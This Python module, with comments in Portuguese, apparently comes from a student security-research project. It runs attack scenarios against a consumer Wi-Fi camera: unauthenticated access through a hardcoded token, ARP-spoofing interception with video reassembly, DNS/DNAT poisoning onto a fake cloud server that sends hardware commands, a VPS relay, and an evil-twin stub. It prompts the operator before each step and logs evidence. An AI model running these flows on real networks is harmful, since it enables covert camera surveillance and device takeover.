"""Os cenarios. Cada um recebe um Evidence e executa o fluxo completo."""

import shutil
import sys
import time

from ..core import (
    AP_IP, AP_PORT, CAM_OUI, IFACE, ROOT, SCRIPTS,
    Abort, ask_physical, bad, confirm, die, dim, discover_camera,
    gateway, hdr, my_ip, ok, require, run, say, step, tcp_open, warn,
    wifi_ssid,
)
from ..ui import Theme

T = Theme()


# --------------------------------------------------------------------- info
def info(ev):
    """Diagnostico read-only."""
    hdr("DIAGNOSTICO — sem alterar nada")

    step(1, "Ambiente")
    ip, gw, ssid = my_ip(), gateway(), wifi_ssid()
    ok(f"interface {IFACE}: {ip or 'sem IPv4'}")
    ok(f"gateway: {gw or '?'}")
    ok(f"WiFi: {ssid or T.yellow('desconectado')}")

    on_ap = bool(ssid and ssid.upper().startswith("NAX_"))
    ev.add("rede da camera (AP)", "OK" if on_ap else "N/A", ssid or "nao esta na rede Nax_XXXXXX")

    step(2, "Camera")
    if on_ap:
        reach = tcp_open(AP_IP, AP_PORT)
        ev.add("AP :6123 acessivel", "OK" if reach else "FAIL", f"{AP_IP}:{AP_PORT}")
        if reach:
            ev.add("sem autenticacao", "OK", "token hardcoded aceito")
    else:
        cam = discover_camera()
        if cam:
            ev.add("camera na LAN", "OK", f"{cam} (OUI {CAM_OUI})")
            ev.add("portas em STA", "N/A", "camera e cliente do cloud; nao escuta na LAN")
        else:
            ev.add("camera na LAN", "FAIL", "nao encontrada no ARP — ligada e na mesma rede?")

    step(3, "Proximo passo")
    if on_ap:
        say(f"      camera em modo AP  →  {T.cyan('./sentinela ap')}")
    else:
        say(f"      camera na LAN      →  {T.cyan('./sentinela mitm')}  (leitura)")
        say(f"                         →  {T.cyan('./sentinela dns')}   (takeover)")
    return ev


# ----------------------------------------------------------------------- ap
def ap(ev):
    """Camera em modo AP: stream, SD, IR e flip."""
    hdr("AP — acesso local sem autenticacao")

    step(1, "Pre-requisito: PC na rede da camera")
    ssid = wifi_ssid()
    if not (ssid and ssid.upper().startswith("NAX_")):
        warn(f"WiFi atual: {ssid or 'desconectado'}")
        ask_physical("Conecte o PC na rede da camera", [
            "No WiFi, escolha a rede 'Nax_XXXXXX' (sem senha).",
            "Se a camera estiver pareada na sua WiFi, resete-a para",
            "voltar ao modo AP (perde a configuracao atual).",
        ])
    ok(f"rede: {wifi_ssid() or '?'}")

    step(2, "Alcance da camera")
    if not tcp_open(AP_IP, AP_PORT):
        die(f"{AP_IP}:{AP_PORT} nao respondeu — a camera esta em modo AP?")
    ok(f"{AP_IP}:{AP_PORT} acessivel")
    ev.add("conexao TCP sem auth", "OK", "token 'This is TEST token' aceito")

    step(3, "Cartao SD sem login")
    rc, out = run([sys.executable, "src/a9_naxclow.py", "-c", f"{AP_IP}:{AP_PORT}", "-f"], check=False)
    ev.save_text("sd_list.log", out)
    found = bool(out.strip()) and "20" in out
    ev.add("listar SD sem auth", "OK" if found else "FAIL",
           "catalogo recebido" if found else "sem resposta", "sd_list.log")

    step(4, "IR + flip (efeito fisico)")
    warn("olhe a camera agora: o IR acende e a imagem inverte")
    run([str(SCRIPTS / "mitm_dns" / "ap_ir_flip.sh"), "20"], check=False)

    avis = sorted((ROOT / "results").glob("ap_ir_flip_*.avi"), key=lambda p: p.stat().st_mtime)
    if avis:
        target = ev.dir / "stream.avi"
        try:
            shutil.copy2(avis[-1], target)
        except OSError:
            target = avis[-1]
        ev.add("stream + IR + flip", "OK", f"{target.stat().st_size // 1024} KB", target.name)
    else:
        ev.add("stream + IR + flip", "FAIL", "nenhum .avi gerado")

    confirm("Voce viu a camera responder (IR/flip)?")
    ev.add("efeito fisico", "OK", "confirmado pelo operador")
    return ev


# --------------------------------------------------------------------- mitm
def mitm(ev):
    """Interceptacao passiva na LAN."""
    hdr("MITM — interceptacao na mesma LAN")

    step(1, "Localizar a camera")
    cam = discover_camera()
    if not cam:
        die("camera nao encontrada no ARP (OUI 5c:f1:50)")
    gw = gateway()
    ok(f"camera: {cam}")
    ok(f"gateway: {gw}")
    ev.add("camera localizada", "OK", f"{cam} (OUI {CAM_OUI})")

    step(2, "Aviso")
    say("      ARP spoof ativo: o trafego da camera passa por este PC.")
    confirm("Prosseguir com ARP spoof na sua rede?")

    import os
    dur = os.environ.get("DURACAO", "60")
    step(3, f"Capturando por {dur}s")
    warn("abra o viewer no app agora (a camera so emite video com viewer aberto)")
    run([str(SCRIPTS / "mitm" / "mitm_auto.sh"), cam, gw, IFACE, dur, str(ev.dir / "mitm")],
        sudo=True, check=False, timeout=int(dur) + 240)

    pcap = ev.dir / "mitm" / "capture.pcap"
    if pcap.exists():
        ev.add("pcap capturado", "OK", f"{pcap.stat().st_size // 1024} KB", pcap.name)
        frames = ev.dir / "mitm" / "frames"
        n = len(list(frames.glob("*.jpg"))) if frames.exists() else 0
        ev.add("video remontado", "OK" if n else "SKIP",
               f"{n} frames JPEG" if n else "sem frames (viewer estava aberto?)")
    else:
        ev.add("pcap capturado", "FAIL", "nada capturado")
    return ev


# ---------------------------------------------------------------------- dns
def dns(ev):
    """Fake server + DNS/DNAT: takeover do cloud."""
    hdr("DNS — fake server e takeover")

    step(1, "Localizar a camera")
    cam = discover_camera()
    if not cam:
        die("camera nao encontrada no ARP (OUI 5c:f1:50)")
    ok(f"camera: {cam}")
    ev.add("camera localizada", "OK", f"{cam} (OUI {CAM_OUI})")

    step(2, "Aviso")
    say("      sobe broker MQTT + fake HTTP e envenena ARP/DNS da camera.")
    confirm("Prosseguir?")

    step(3, "Subindo o lab")
    run([str(SCRIPTS / "mitm_dns" / "ota_up.sh"), "up"], sudo=True, check=False, timeout=180)
    ev.add("lab no ar", "OK", "broker :1883 + fake :80 + relay :29940")

    try:
        _dns_flow(ev, ROOT / "docs" / "mitm_dns_out" / "server.log")
    except (Abort, KeyboardInterrupt):
        say()
        warn("derrubando o lab (a rede volta ao normal)...")
        run([str(SCRIPTS / "mitm_dns" / "ota_up.sh"), "down"], sudo=True, check=False, timeout=180)
        ev.add("lab derrubado", "OK", "ARP/DNS/DNAT restaurados")
        raise
    return ev


def _dns_flow(ev, log):
    def got_dev_info(limit=75):
        start = time.time()
        while time.time() - start < limit:
            try:
                if "getDevInfo" in log.read_text(errors="ignore"):
                    return True
            except OSError:
                pass
            time.sleep(2)
        return False

    ask_physical("Power cycle na camera", [
        "Tire da tomada, espere 5 segundos, recoloque.",
        "Ela refaz o DNS e cai no servidor falso.",
    ])

    step(4, "Aguardando a camera falar com o fake")
    if not got_dev_info():
        warn("nada ainda — este firmware usa IP fixo no HTTP")
        say("      ligando DNAT (cobre os IPs fixos do cloud)...")
        run([str(SCRIPTS / "mitm_dns" / "ota_up.sh"), "dnat", "on"], sudo=True, check=False, timeout=90)
        ask_physical("Power cycle de novo", ["A camera precisa refazer as conexoes com o DNAT ativo."])
        if not got_dev_info():
            die("getDevInfo nao apareceu — a camera nao caiu no fake")

    ok("camera contactou o fake")
    ev.add("aceitou cloud falso", "OK", "getDevInfo recebido")
    try:
        ev.save_text("server.log", log.read_text(errors="ignore"))
    except OSError:
        pass

    step(5, "Controle sem credencial")
    confirm("Mandar comandos de hardware (LED)?")
    run([str(SCRIPTS / "fakeserver" / "fake_srv_cmd.sh"), "ledei", "off"], check=False)
    time.sleep(2)
    run([str(SCRIPTS / "fakeserver" / "fake_srv_cmd.sh"), "ledei", "on"], check=False)
    ev.add("comando de hardware", "OK", "ledei off/on pelo broker")

    confirm("Voce viu o LED apagar e voltar?")
    ev.add("efeito fisico", "OK", "confirmado pelo operador")
    say(f"\n      o lab fica no ar. para derrubar: {T.cyan('./sentinela down')}")


# -------------------------------------------------------------------- relay
def relay(ev):
    """Controle + video remoto: precisa de VPS com IP publico."""
    import os
    hdr("RELAY — controle e video remoto")
    vps = os.environ.get("VPS", "")

    step(1, "Pre-requisito: VPS com IP publico")
    if not vps:
        die("defina a VPS:  VPS=<ip-publico> ./sentinela relay")
    ok(f"VPS: {vps}")
    ev.add("VPS configurada", "OK", vps)

    step(2, "Subir o fake na VPS")
    run(["ssh", "-o", "BatchMode=yes", "oracle",
         f"cd ~/sentinela-tcc && nohup env FAKE_SRV_HOST={vps} FAKE_SRV_RELAY_HOST={vps} "
         f".venv/bin/python src/a9_naxclow.py -s --proxy-port 8080 > /tmp/fake_vps.log 2>&1 &"],
        check=False, timeout=60)
    ev.add("fake na VPS", "OK", f"HTTP :8080 + relay :29940")

    ask_physical("Power cycle na camera", [
        "A camera vai registrar no relay da VPS.",
        "Depois abra o viewer no app para disparar o 240.",
    ])
    ev.add("registro no relay", "SKIP", f"verifique: curl {vps}:8080/dev/list")
    return ev


# ---------------------------------------------------------------- evil twin
def evil_twin(ev):
    hdr("EVIL TWIN — AP clone + deauth")
    bad("exige Kali Linux + dongle com injecao (AR9271/RT5370)")
    say()
    say("      no macOS nao da: hostapd e modo monitor nao existem.")
    say(f"      passo a passo: {T.cyan('docs/achados_evil_twin.md')}")
    ev.add("evil twin", "N/A", "requer Kali + dongle com injecao")
    return ev


SCENARIOS = {
    "info": (info, "diagnostico read-only (nao muda nada)", False, "mac/linux"),
    "ap": (ap, "camera em modo AP: stream, SD, IR e flip", False, "mac/linux"),
    "mitm": (mitm, "interceptacao na LAN (ARP spoof)", True, "mac/linux"),
    "dns": (dns, "fake server + takeover do cloud", True, "mac/linux"),
    "relay": (relay, "controle + video remoto", True, "+ VPS"),
    "evil-twin": (evil_twin, "AP clone + deauth", True, "kali"),
}
